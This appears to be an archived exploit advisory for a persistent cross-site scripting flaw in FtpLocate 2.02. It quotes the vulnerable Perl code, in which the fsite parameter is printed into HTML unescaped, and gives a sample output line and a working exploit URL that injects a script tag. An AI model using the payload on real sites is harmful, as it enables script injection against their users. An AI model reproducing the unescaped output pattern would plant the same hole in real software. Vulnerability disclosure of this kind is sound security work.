@@ -1,0 +1,80 @@
+id: 20938
+date: 06/25/2013
+title: FtpLocate 2.02 Cross Site Scripting Vulnerability
+author: Chako
+cves: 
+
+#############################################################
+#
+# Exploit Title: FtpLocate 2.02 Persistent XSS
+# Date: 2013/6/23 
+# Exploit Author: Chako 
+# Firmware Version: 2.02
+# Tested on: Windows 7
+# Vendor Homepage: http://turtle.ee.ncku.edu.tw/ftplocate/readme.english.html
+#                  http://www.freshports.org/ftp/ftplocate/
+# File Download: ftp://ftp.freebsd.org/pub/FreeBSD/ports/distfiles/ftplocate-2.02.tar.gz
+#############################################################
+
+  
+/bin/flsearch.pl (LINE: 22-34)
+-----------------------------------------------------------------------------
+$query=clean_str($input{'query'}); $query_raw=CGI::escape($query);
+$fsite=clean_str($input{'fsite'}); $fsite_raw=CGI::escape($fsite);
+$page=$input{'page'};
+$client=ip2fqdn(client_ip());
+
+if ( $fsite eq "" ) {
+  $resultfname=$query_raw;
+  $CGIF="";
+  $STRF="";
+} else {
+  $resultfname=$query_raw."-$fsite";
+  $CGIF="&fsite=$fsite_raw";  # for cgi page list
+  $STRF="&nbps;$fsite";    # for output
+}
+-----------------------------------------------------------------------------
+
+
+/bin/flhistory.pl (LINE: 85-110)
+-----------------------------------------------------------------------------
+$rmax=$#log-$logmin;
+$rmin=$#log-$logmax;
+for ($i=$rmax; $i>=$rmin; $i--) {
+  ($date, $time, $usedtime, $client, $_, $cache, $founditem, $query)=split(/\s/,$log[$i],8);
+  ($script,$fsite)=/(.*)\((.*)\)/;
+  if ( $script =~ "flserv" ) { $script="flsearch"; }
+  $url=dirname($ENV{'SCRIPT_NAME'})."/$script.pl?query=".CGI::escape($query)."&fsite=$fsite";
+  $q=safe_query_str($query);
+  if ( $nowclient eq $client ) {
+    $color="#c00000";  
+  } else {
+    $color="#000000";  
+  }
+
+  print qq|<tr>
+<td nowrap><font size=-1>$date</font></td>
+<td nowrap><font size=-1>$time</font></td>
+<td align=center nowrap><font size=-1>$usedtime</font></td>
+<td nowrap><font size=-1 color=$color>$client</font></td>
+<td nowrap><font size=-1 color=#999999>$script($fsite)</font></td>
+<td align=center nowrap><font size=-1>$cache</font></td>
+<td align=center nowrap><font size=-1>$founditem</font></td>
+<td nowrap><font size=-1><a href="$url">$q</a></font></td>
+</tr>
+|;
+}
+-----------------------------------------------------------------------------
+
+
+Sample Output from flhistory.pl :
+-----------------------------------------------------------------------------
+<td nowrap><font size=-1 color=#999999>flsearch(<script>alert('xss')</script>)</font></td>
+
+
+Exploit:
+-----------------------------------------------------------------------------
+
+http://Target_Example/cgi-bin/ftplocate/flsearch.pl?query=FTP&fsite=<script>alert('xss')</script>
+
+#  0day.today [2023-03-26]  #
